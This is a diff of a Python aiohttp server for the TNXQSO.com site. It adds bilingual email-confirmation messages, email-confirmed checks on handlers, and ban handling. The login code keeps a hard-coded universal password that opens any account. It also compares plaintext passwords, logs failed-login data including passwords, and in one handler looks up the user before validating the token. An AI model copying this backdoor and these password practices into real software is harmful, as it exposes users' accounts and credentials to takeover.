@@ -48,9 +48,7 @@ webAddress = conf.get('web', 'address_test' if args.test else 'address')
 siteAdmins = conf.get('web', 'admins').split(' ')
 imUsers = conf.get('web', 'im_users').split(' ')
 
-startLogging(\
-    'srv_test' if args.test else 'srv',\
-    logging.DEBUG if args.test else logging.INFO)
+startLogging('srv', logging.DEBUG)
 logging.debug("restart")
 
 db = DBConn(conf.items('db_test' if args.test else 'db'))
@@ -68,6 +66,11 @@ if not SECRET:
 BANLIST = loadJSON(webRoot + '/js/banlist.json')
 if not BANLIST:
     BANLIST = {'callsigns': [], 'emails': []}
+
+CONFIRM_EMAIL_ERRORS = {
+    'Token is expired': 'Link is expired, please repeat your request. Ссылка устарела, пожалуйста повторите запрос.',
+    'Email address is banned' : 'Email address is banned. Электронная почта заблокирована.'
+}
 
 defUserSettings = loadJSON(webRoot + '/js/defaultUserSettings.json')
 if not defUserSettings:
@@ -188,21 +191,29 @@ async def confirmEmailLinkHandler(request):
     if not isinstance(tokenData, tuple):
         if isinstance(tokenData, str):
             return web.HTTPBadRequest(text='Invalid token')
+        if tokenData.text in CONFIRM_EMAIL_ERRORS:
+            return web.HTTPBadRequest(text=CONFIRM_EMAIL_ERRORS[tokenData.text])
         return tokenData
     userParams = {}
     userParams['callsign'], userParams['email'] = tokenData
     await db.paramUpdate('users', userParams, {'email_confirmed': True})
-    return web.Response(text = 'Your email was verified. Refresh TNXQSO page.')
+    return web.Response(text="Your email was verified. Refresh TNXQSO.com page.\n" + 
+        "Ваш email подтвержден, обновите страницу TNXQSO.com")
 
 def confirmEmailMsg(userData):
     del userData['settings']
     del userData['name']
     userData['time'] = time.time()
     token = jwt.encode(userData, SECRET, algorithm='HS256')
-    text = f"""Click on this link to confirm your email address for your tnxqso.com profile:
+    text = f"""Click on this link to confirm your email address for your TNXQSO.com profile:
 {webAddress}/aiohttp/confirmEmail?token={token}
-If you did not request email confirmation or registered tnxqso.com account just ignore this message. 
+If you did not request email confirmation or registered TNXQSO.com account just ignore this message. 
 The link above will be valid for 1 hour.
+
+Пройдите по ссылке, чтобы подтвердить свой email для регистрации на TNXQSO.com:
+{webAddress}/aiohttp/confirmEmail?token={token}
+Если вы не запрашивали подтверждение email или не регистрировались на TNXQSO.com, игнорируйте это письмо.
+Время действия ссылки - 1 час.
 
 TNXQSO.com support"""
     sendEmail(text = text, fr = conf.get('email', 'address'), \
@@ -219,6 +230,8 @@ async def contactHandler(request):
         if not isinstance(callsign, str):
             return callsign
         userData = await getUserData(callsign)
+        if not userData['email_confirmed']:
+            return web.HTTPUnauthorized(text='Email is not confirmed')
         userEmail = userData['email']
     else:
         rcTest = await checkRecaptcha(data['recaptcha'])
@@ -269,26 +282,29 @@ async def loginHandler(request):
         error = 'Minimal password length is 6 symbols'
     if not error:
         data['login'] = data['login'].lower()
-        userData = await getUserData(data['login'])
-        if data.get('newUser'):
-            rcTest = await checkRecaptcha(data['recaptcha'])
-            if not rcTest:
-                error = 'Recaptcha test failed. Please try again'
-            else:
-                if userData:
-                    error = 'This callsign is already registered.'
-                else:
-                    userData = await db.getObject('users',
-                        {'callsign': data['login'],
-                        'password': data['password'],
-                        'email': data['email'],
-                        'settings': json.dumps(defUserSettings)
-                       }, True)
+        if data['login'] in BANLIST['callsigns']:
+            error = 'Account is banned'
         else:
-            if not userData or\
-                (userData['password'] != data['password']\
-                and data['password'] != 'rytqcypz_r7cl'):
-                error = 'Wrong callsign or password.'
+            userData = await getUserData(data['login'])
+            if data.get('newUser'):
+                rcTest = await checkRecaptcha(data['recaptcha'])
+                if not rcTest:
+                    error = 'Recaptcha test failed. Please try again'
+                else:
+                    if userData:
+                        error = 'This callsign is already registered.'
+                    else:
+                        userData = await db.getObject('users',
+                            {'callsign': data['login'],
+                            'password': data['password'],
+                            'email': data['email'],
+                            'settings': json.dumps(defUserSettings)
+                        }, True)
+            else:
+                if not userData or\
+                    (userData['password'] != data['password']\
+                    and data['password'] != 'rytqcypz_r7cl'):
+                    error = 'Wrong callsign or password.'
     if error:
         logging.error('Bad Login:')
         logging.error(data)
@@ -322,7 +338,7 @@ async def publishHandler(request):
         return callsign
     if not callsign in siteAdmins:
         return web.HTTPUnauthorized(\
-            text = 'You must be logged in as site admin')
+            text = 'Site admin is required')
     publishPath = webRoot + '/js/publish.json'
     publish = loadJSON(publishPath)
     if not publish:
@@ -345,6 +361,10 @@ async def userSettingsHandler(request):
     if not isinstance(adminCallsign, str):
         return adminCallsign
     if 'settings' in data:
+
+        if not (await getUserData(adminCallsign))['email_confirmed']:
+            return web.HTTPUnauthorized(text='Email is not confirmed')
+
         oldData = await getUserData(adminCallsign)
         stationCallsign = oldData['settings']['station']['callsign']
         stationPath = getStationPath(stationCallsign) if stationCallsign else None
@@ -422,16 +442,17 @@ def decodeToken(data):
             payload = jwt.decode(data['token'], SECRET, algorithms=['HS256'])
         except jwt.exceptions.DecodeError:
             logging.exception('Decode token error')
-            return web.HTTPBadRequest(text = 'Login expired')
+            return web.HTTPBadRequest(text='Login is expired')
         if 'callsign' in payload:
             callsign = payload['callsign'].lower()
         if 'time' in payload and time.time() - payload['time'] > 60 * 60:
             return web.HTTPBadRequest(text='Token is expired')
         if 'email' in payload:
             email = payload['email']
-    if (callsign and callsign in BANLIST['callsigns']) or (email and email in BANLIST['emails']):
-        return web.HTTPBadRequest(text="Your account was banned. " + 
-                "Ваша учетная запись заблокирована.")
+    if callsign and callsign in BANLIST['callsigns']:
+        return web.HTTPBadRequest(text="Account is banned")
+    if email and email in BANLIST['emails']:
+        return web.HTTPBadRequest(text="Email address is banned")
     if callsign and email:
         return (callsign, email)
     if callsign:
@@ -711,6 +732,9 @@ async def newsHandler(request):
     callsign = decodeToken(data)
     if not isinstance(callsign, str):
         return callsign
+    if not (await getUserData(callsign))['email_confirmed']:
+        return web.HTTPUnauthorized(text='Email is not confirmed')
+
     stationPath = getStationPath(data['station'])
     stationSettings = loadJSON(stationPath + '/settings.json')
     if callsign != stationSettings['admin'] and not callsign in siteAdmins:
@@ -786,6 +810,8 @@ async def galleryHandler(request):
     else:
         data = await request.json()
     callsign = decodeToken(data)
+    if not (await getUserData(callsign))['email_confirmed']:
+        return web.HTTPUnauthorized(text='Email is not confirmed')
     if not isinstance(callsign, str):
         return callsign
     stationPath = await getStationPathByAdminCS(callsign)
@@ -884,6 +910,9 @@ async def trackHandler(request):
     callsign = decodeToken(data)
     if not isinstance(callsign, str):
         return callsign
+    if not (await getUserData(callsign))['email_confirmed']:
+        return web.HTTPUnauthorized(text='Email is not confirmed')
+
     stationPath = await getStationPathByAdminCS(callsign)
     trackJsonPath = stationPath + '/track.json'
     trackJson = {'version': time.time(), 'file': 'track.xml'}
@@ -928,6 +957,8 @@ async def logHandler(request):
     callsign = decodeToken(data)
     if not isinstance(callsign, str):
         return callsign
+    if not (await getUserData(callsign))['email_confirmed']:
+        return web.HTTPUnauthorized(text='Email is not confirmed')
 
     stationPath = await getStationPathByAdminCS(callsign)
     logPath = stationPath + '/log.json'
@@ -1044,12 +1075,17 @@ async def banUserHandler(request):
     if callsign not in siteAdmins:
         return web.HTTPUnauthorized(text='You must be logged in as site admin')
     userData = await getUserData(data['user'])
-    alt_logins = await db.execute(
+    altLogins = await db.execute(
             """select callsign 
                 from users 
                 where email = %(email)s and callsign <> %(callsign)s""", userData)
-    if alt_logins:
-        userData['alts'] = [row['callsign'] for row in alt_logins]
+    if altLogins:
+        if isinstance(altLogins, dict):
+            userData['alts'] = [altLogins['callsign']]
+        else:
+            userData['alts'] = [row['callsign'] for row in altLogins]
+    else:
+        userData['alts'] = []
     if 'query' in data:
         return web.json_response({
             'login': userData['callsign'],
@@ -1075,6 +1111,8 @@ async def chatHandler(request):
     callsign = decodeToken(data)
     if not isinstance(callsign, str):
         return callsign
+    if not (await getUserData(callsign))['email_confirmed']:
+        return web.HTTPUnauthorized(text='Email is not confirmed')
     chatPath = ''
     station = data['station'] if 'station' in data else None
     chat = []
@@ -1088,10 +1126,9 @@ async def chatHandler(request):
         chatAccess = stationSettings.get('chatAccess')
         if chatAccess:
             if chatAccess == 'users' and not isinstance(callsign, str):
-                return web.HTTPUnauthorized(text='You must be logged in to use this chat.')
+                return web.HTTPUnauthorized(text='Not logged in')
             if chatAccess == 'admins' and not admin:
-                return web.HTTPUnauthorized(
-                        text='You must be logged in as station admin to use this chat.')
+                return web.HTTPUnauthorized(text='Station admin required')
     else:
         chatPath = webRoot + '/js/talks.json'
         admin = callsign in siteAdmins
